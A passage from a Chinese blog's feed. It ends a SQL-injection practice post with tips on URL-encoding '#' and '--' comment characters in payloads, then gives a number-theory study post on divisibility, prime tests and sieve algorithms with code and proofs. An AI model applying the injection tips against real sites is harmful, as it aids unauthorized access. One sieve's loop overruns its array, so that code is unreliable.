title="关于url编码"></a>关于url编码</h3><p><strong>SQL注入过程是会经过URL编码的，****因此，#注释和–注释的注入方法是有区别的，</strong><br><strong>区别在于#需要经过url编码为%23</strong>，**–注释后边紧跟的字符也需要经过url编码。**</p><h3 id="关于优先级"><a href="#关于优先级" class="headerlink" title="关于优先级"></a>关于优先级</h3><p><strong>表格省，划重点-AND &gt; OR</strong></p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息安全数学基础-第一章-整除</title>
    <link href="/dong.github/2024/09/02/secmath0/"/>
    <url>/dong.github/2024/09/02/secmath0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>这一章讲了初等数论的整除部分，这篇文章是对这章内容的重点归纳和拓展</strong></p><span id="more"></span><p><strong>这章内容解决了以前在算法编程中遇到的几个问题，当时只是苦思冥想，不知其所以然。通过这次对理论的学习忽然理解了算法背后的设计思想，写下这篇博客，记录一下灵感乍现的惊喜。</strong></p><blockquote><ul><li><strong>判断素数问题，定理1.4对应到了O(√n)算法优化方法的证明</strong></li><li><strong>素数筛的两种方法：埃氏筛和欧拉筛，刚好对应了两种素数不可穷举的证明思想</strong></li><li><strong>辗转相除法及其证明</strong></li><li><strong>贝祖定理，扩展欧几里得算法的应用</strong></li><li><strong>素数的性质，最大公因数和最小公倍数</strong></li></ul></blockquote><h1 id="重要定理及证明-素数部分"><a href="#重要定理及证明-素数部分" class="headerlink" title="重要定理及证明(素数部分)"></a>重要定理及证明(素数部分)</h1><h2 id="定理1-3："><a href="#定理1-3：" class="headerlink" title="定理1.3："></a>定理1.3：</h2><blockquote><ul><li><strong>设a,b,c!&#x3D;0是三个正整数。若c|a，c|b，则对任意整数s,t有</strong></li><li><strong>c | s<em>a+t</em>b</strong></li></ul></blockquote><p><strong>这条定理通过整除定义证明即可。但是这条定理也值得记下，它提供了后边欧几里得除法的证明方式，而扩展欧几里得除法提供了求逆元的方法，这又是后续RSA加密算法的关键环节，所以说这条定理差不多算是大楼的第一块砖了，基础却重要。</strong></p><h2 id="定理1-4"><a href="#定理1-4" class="headerlink" title="定理1.4"></a>定理1.4</h2><blockquote><ul><li><strong>设n是一个正合数，p是n的一个大于1的最小正因数，则p一定是素数，且p小于等于√n。</strong><br> <strong>这条定理应该是整除部分最重要的之一了。</strong></li><li><strong>空口无凭，举个实际应用的例子-判断一个数是否是素数：</strong><br><b><font color="#b30b00">“非正式地说，这条定理说明了两点：素数可以视为合数的“组成部分”，且这一“组成成分”中必然有一部分小于√n”</font></b></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_prime</span>(<span class="hljs-params">n</span>):  <br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">1</span>:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <br>    <span class="hljs-keyword">if</span> n &lt;= <span class="hljs-number">3</span>:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <br>    <span class="hljs-keyword">if</span> n % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> n % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <br>    i = <span class="hljs-number">5</span>  <br>    <span class="hljs-keyword">while</span> i * i &lt;= n:  <br>        <span class="hljs-keyword">if</span> n % i == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> n % (i + <span class="hljs-number">2</span>) == <span class="hljs-number">0</span>:  <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <br>        i += <span class="hljs-number">6</span>  <br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p><strong>为什么只枚举到√n?，这里就用到了定理1.4，大大提高了算法时间复杂度。</strong><br><strong>值得说明的是，对于判断素数问题，O(√n)即是速度瓶颈，也就是说这基本上是最快的方法了。</strong></p><h2 id="定理1-5"><a href="#定理1-5" class="headerlink" title="定理1.5"></a>定理1.5</h2><blockquote><p><strong>素数有无穷多个</strong><br><strong>课上讲了两种证明方法，思考发现，两种证明思想刚刚好对应了两种编程算法，这里先介绍证明方法：</strong></p></blockquote><h3 id="证明A："><a href="#证明A：" class="headerlink" title="证明A："></a>证明A：</h3><p><img src="/dong.github/images/0902-3.png"></p><h3 id="证明B"><a href="#证明B" class="headerlink" title="证明B:"></a>证明B:</h3><p><img src="/dong.github/images/0902-2.jpg"></p><h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h3><p><strong>对于寻找范围内所有素数的问题，网上资料会说：欧拉筛是埃氏筛法的优化、欧拉筛和埃氏筛的本质都一样：“素数的倍数不是素数。”、欧拉筛避免了埃氏筛中重复筛选的问题、等等.</strong></p><p><strong>这些说法都不错，但是当我们学过算法的数学理论，不难发现这两种算法其实是两种不同证明思想的体现，而不是简单的算法优化与继承。</strong></p><p><strong>埃氏筛法对应证法A，欧拉筛对应证法B</strong></p><h4 id="Eraosthenes（埃拉托斯尼筛法）埃氏筛法"><a href="#Eraosthenes（埃拉托斯尼筛法）埃氏筛法" class="headerlink" title="Eraosthenes（埃拉托斯尼筛法）埃氏筛法"></a>Eraosthenes（埃拉托斯尼筛法）埃氏筛法</h4><p><strong>时间复杂度O（nloglogn）</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">2e6</span><span class="hljs-number">+6</span>;<br><span class="hljs-type">bool</span> isprime[maxn];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">seive</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">memset</span>(isprime,<span class="hljs-literal">true</span>,<span class="hljs-built_in">sizeof</span>(isprime));<br>    isprime[<span class="hljs-number">0</span>]=isprime[<span class="hljs-number">1</span>]=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=maxn;i++)&#123;<br>        <span class="hljs-keyword">if</span> (isprime[i]&amp;&amp;i&lt;<span class="hljs-built_in">sqrt</span>(maxn)) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i * i; j &lt;= maxn; j += i) &#123;<span class="hljs-comment">//枚举倍数并筛去</span><br>                isprime[j] = <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Attention：</span><br><span class="hljs-comment">//1.Q:如何理解它与证明A的联系？</span><br><span class="hljs-comment">//  A:反证存在无限个素数的过程实际上提供了一种寻找素数的方法，进而完成素数的筛选。</span><br><span class="hljs-comment">//2.Q:如何理解并证明埃氏筛重复筛选的问题？</span><br><span class="hljs-comment">//  A:例如：对于6就有重复的筛选-2*3和3*2</span><br><span class="hljs-comment">//3.Q:为什么j要从i平方开始枚举，如何证明这样做的正确性?</span><br><span class="hljs-comment">//4.Q:i可以枚举到√maxn就停止吗？</span><br></code></pre></td></tr></table></figure><h5 id="埃氏筛法的相关证明"><a href="#埃氏筛法的相关证明" class="headerlink" title="埃氏筛法的相关证明"></a>埃氏筛法的相关证明</h5><h6 id="证明从i平方开始枚举可行"><a href="#证明从i平方开始枚举可行" class="headerlink" title="证明从i平方开始枚举可行"></a>证明从i平方开始枚举可行</h6><p><img src="/dong.github/images/0915.png"></p><h6 id="证明埃氏筛正确，并证明它无法避免重复筛选"><a href="#证明埃氏筛正确，并证明它无法避免重复筛选" class="headerlink" title="证明埃氏筛正确，并证明它无法避免重复筛选"></a>证明埃氏筛正确，并证明它无法避免重复筛选</h6><p>假设存在一个数n，它是i的倍数但大于i^2，且n还没有被任何小于i的质数筛去。那么n可以表示为n &#x3D; i * k，其中k &gt; i。</p><ul><li><p>如果k是质数:<br>那么k一定大于i（因为k是n的因子且n &gt; i^2），那么k*i &gt; i^2，那么当前i一定可以筛掉这个n，合理。</p></li><li><p>如果k是合数:<br>那么根据定理1.23（算术基本定理），任意整数可以唯一的表示成:</p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><msup><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msup><mi>p</mi><msup><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub></msup><mi>p</mi><msup><mn>3</mn><msub><mi>a</mi><mn>3</mn></msub></msup><mo>⋯</mo><msubsup><mi>p</mi><mi>k</mi><msub><mi>a</mi><mi>k</mi></msub></msubsup><mo separator="true">,</mo><msub><mi>p</mi><mi>i</mi></msub><mo>&lt;</mo><msub><mi>p</mi><mi>j</mi></msub><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">n=p1^{a_1} p2^ {a_2}p3^ {a_3}\cdots p_k^{a_k},p_i &lt; p_j,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0534em;vertical-align:-0.3013em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7521em;"><span style="top:-2.3987em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1507em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">,</span></span></span></span>且都是素数<p>那么之前遍历过的素数一定筛掉了当前的n，合理。</p></li><li><p>综上所述，埃氏筛可以实现不漏的筛选。</p></li><li><p>无法避免重复?，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><msup><mn>1</mn><msub><mi>a</mi><mn>1</mn></msub></msup><mi>p</mi><msup><mn>2</mn><msub><mi>a</mi><mn>2</mn></msub></msup><mi>p</mi><msup><mn>3</mn><msub><mi>a</mi><mn>3</mn></msub></msup><mo>⋯</mo><msubsup><mi>p</mi><mi>k</mi><msub><mi>a</mi><mi>k</mi></msub></msubsup></mrow><annotation encoding="application/x-tex">n=p1^{a_1} p2^ {a_2}p3^ {a_3}\cdots p_k^{a_k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0534em;vertical-align:-0.3013em;"></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7521em;"><span style="top:-2.3987em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span><span style="top:-3.1507em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3488em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1512em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3013em;"><span></span></span></span></span></span></span></span></span></span>里边有几个素数，n就被重复筛了多少次。由此，每个数被重复筛掉过次数也可以知道了。</p></li></ul><h6 id="证明是可以缩小i的枚举范围至√maxn，回答优化后的算法时间复杂度。"><a href="#证明是可以缩小i的枚举范围至√maxn，回答优化后的算法时间复杂度。" class="headerlink" title="证明是可以缩小i的枚举范围至√maxn，回答优化后的算法时间复杂度。"></a>证明是可以缩小i的枚举范围至√maxn，回答优化后的算法时间复杂度。</h6><ul><li>证明就是定理1.4，无需再枚举大于√maxn的素数，因为正合数n的最小正因数一定小于√n，且为素数。<br><strong>这也是手算的重要技巧，被老师在课堂重点强调：</strong><br><img src="/dong.github/images/0915-1.png">    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8a9d8570" role="button" aria-expanded="false" aria-controls="collapse-8a9d8570">        <div class="fold-arrow">▶</div>编程测试      </div>      <div class="fold-collapse collapse" id="collapse-8a9d8570">        <div class="fold-content">          <div class="group-image-container"><div class="group-image-row"><div class="group-image-wrap"><img src="/dong.github/images/0915-3.png" alt="正确性"></div><div class="group-image-wrap"><img src="/dong.github/images/0915-2.png" alt="O（√nloglogn）"></div></div></div>**调用计时函数，计算1000以内的素数1000次，记录运行时间**<p><strong>可以看到，优化后的埃氏筛法快了近一倍！</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> maxn=<span class="hljs-number">1e3</span>;<br><span class="hljs-type">bool</span> isprime[maxn<span class="hljs-number">+10</span>];<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> ull;<br><span class="hljs-type">clock_t</span> start,endd;<br><span class="hljs-type">double</span> duration;<br><span class="hljs-type">int</span> Test = <span class="hljs-number">1000</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">seive</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">memset</span>(isprime,<span class="hljs-literal">true</span>,<span class="hljs-built_in">sizeof</span>(isprime));<br>isprime[<span class="hljs-number">0</span>]=isprime[<span class="hljs-number">1</span>]=<span class="hljs-literal">false</span>;<br><span class="hljs-keyword">for</span>(ull i=<span class="hljs-number">2</span>;i&lt;=maxn;i++)&#123;<br><span class="hljs-comment">//if(i &gt;= sqrt(maxn))break;</span><br><span class="hljs-keyword">if</span> (isprime[i]) &#123;<br><span class="hljs-keyword">for</span> (ull j = i * i; j &lt;= maxn; j += i) &#123;<span class="hljs-comment">//枚举倍数并筛去</span><br>isprime[j] = <span class="hljs-literal">false</span>;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//start = clock();</span><br><span class="hljs-comment">//for(int i = 0;i &lt; Test;++ i)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-built_in">seive</span>();<br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//endd = clock();</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; maxn;++i)<br>&#123;<br><span class="hljs-keyword">if</span>(isprime[i])<br>&#123;<br>cout &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br>&#125;<br>cout &lt;&lt; endl;<br><span class="hljs-comment">//printf(&quot;ticks%d=%f\n&quot;,maxn,(double)(endd-start));</span><br><span class="hljs-comment">//duration = ((double)(endd-start))/CLK_TCK;</span><br><span class="hljs-comment">//printf(&quot;duration%d=%lf\n&quot;,maxn,duration);</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>        </div>      </div>    </div></li></ul><h4 id="欧拉筛"><a href="#欧拉筛" class="headerlink" title="欧拉筛"></a>欧拉筛</h4><p><strong>时间复杂度:O（n）</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e8</span> + <span class="hljs-number">3</span>;<br><span class="hljs-type">bool</span> isprime[N];<br><span class="hljs-type">int</span> prime[N],cnt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ola</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br><span class="hljs-built_in">memset</span>(isprime, <span class="hljs-literal">true</span>, <span class="hljs-built_in">sizeof</span>(isprime));<br>isprime[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br> <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;<br><span class="hljs-keyword">if</span> (isprime[i]) prime[++cnt] = i;<span class="hljs-comment">//如果i没有被前面的数筛掉，则i是素数</span><br> <br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j&lt;=cnt&amp;&amp;prime[j] &lt;= n/i; j++) &#123;<span class="hljs-comment">//j枚举已经筛出的素数</span><br>isprime[i * prime[j]] = <span class="hljs-number">0</span>;<span class="hljs-comment">//把i*prime[j]筛掉</span><br><span class="hljs-keyword">if</span> (i % prime[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<span class="hljs-comment">//保证不会重复筛</span><br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//1.Q:为什么要再开一个数组记录素数?</span><br><span class="hljs-comment">// .A:继承证明B的思想，另外，这也是一种空间换时间的算法思路。</span><br><span class="hljs-comment">//2.Q:if (i % prime[j] == 0) break;如何保证不重复的？</span><br><span class="hljs-comment">//  A:模拟一下代码运行过程考虑一会即可知。</span><br></code></pre></td></tr></table></figure><h2 id="补充定理："><a href="#补充定理：" class="headerlink" title="补充定理："></a>补充定理：</h2><p><img src="/dong.github/images/0915-4.png"></p><h2 id="课堂思考题及证明："><a href="#课堂思考题及证明：" class="headerlink" title="课堂思考题及证明："></a>课堂思考题及证明：</h2><p><img src="/dong.github/images/0902.jpg"></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-7cd4d09c" role="button" aria-expanded="false" aria-controls="collapse-7cd4d09c">        <div class="fold-arrow">▶</div>证明      </div>      <div class="fold-collapse collapse" id="collapse-7cd4d09c">        <div class="fold-content">          <p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext mathvariant="bold">证明：（反证法）</mtext><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">若</mtext><mi mathvariant="bold">n</mi><mi mathvariant="bold">&#x2F;</mi><mi mathvariant="bold">p</mi><mtext mathvariant="bold">为合数，</mtext><mi mathvariant="bold">∃</mi><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>∈</mo><mo stretchy="false">[</mo><mn mathvariant="bold">2</mn><mo separator="true">,</mo><mi mathvariant="bold">n</mi><mi mathvariant="bold">&#x2F;</mi><mi mathvariant="bold">p</mi><mo stretchy="false">]</mo></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">使得：</mtext><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>&#x3D;</mo><mi mathvariant="bold">n</mi><mi mathvariant="bold">&#x2F;</mi><mi mathvariant="bold">p</mi></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">则</mtext><mi mathvariant="bold">p</mi><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">1</mn></msub><msub><mi mathvariant="bold">p</mi><mn mathvariant="bold">2</mn></msub><mo>&#x3D;</mo><mi mathvariant="bold">n</mi></mrow><mspace linebreak="newline"></mspace><mrow><mtext mathvariant="bold">又</mtext><mi 